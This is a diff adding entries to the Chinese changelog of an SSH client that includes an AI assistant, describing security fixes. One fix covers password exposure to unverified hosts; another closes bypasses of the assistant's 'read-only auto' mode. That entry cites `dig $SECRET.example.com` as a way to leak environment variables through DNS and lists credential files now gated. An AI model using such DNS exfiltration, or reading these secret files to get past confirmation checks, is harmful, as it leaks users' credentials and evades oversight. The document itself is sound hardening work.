@@ -12,6 +12,7 @@
 
 ### 修复
 
+- 从托盘菜单点「检查更新」时，更新窗口会出现在最前面，不再被别的窗口挡在后面。
 - 「测试连接」不再把保存的密码发给还没信任的主机：遇到没见过的主机，或者只保存过别种类型密钥的主机，测试只做到握手和显示指纹为止，不进行密码 / 键盘交互验证，结果写明「主机指纹 … 尚未信任，没有测试登录；请先正式连接一次并核对指纹」；跳板链上哪一跳没信任就停在那一跳，后面的主机不连。以前这两种情况会先「仅本次信任」再用保存的密码登录，中间人出示一种没保存过的密钥类型就能拿到明文密码。已经信任的主机照常测试登录。
 - AI 助手「只读自动」模式补了几处会被绕过去的地方：`ping`、`dig`、`nslookup`、`host`、`traceroute`、`tracepath`、`mtr` 的参数里只要有变量、通配符或大括号展开，就不再自动执行（以前 `dig $SECRET.example.com` 这类写法能把环境变量里的内容通过 DNS 查询带出去）；`kubectl get` / `describe` 读 Secret（包括 `secret/名字`、`pods,secrets`、`--raw`）要确认，`kubectl logs` 等不碰 Secret 的照旧自动；命令里带 `<<` / `<<<`（here-doc、here-string）的一律要确认。
 - 「只读自动」读到这些文件也要确认了：sshd 主机私钥（`ssh_host_*_key`，`.pub` 公钥不算）、`/proc/*/environ`（进程的环境变量）、`.bash_history`、`.zsh_history`、`.mysql_history`、`.psql_history`、`.python_history`、`.vault-token`、`credentials.json`、`service-account*.json`。
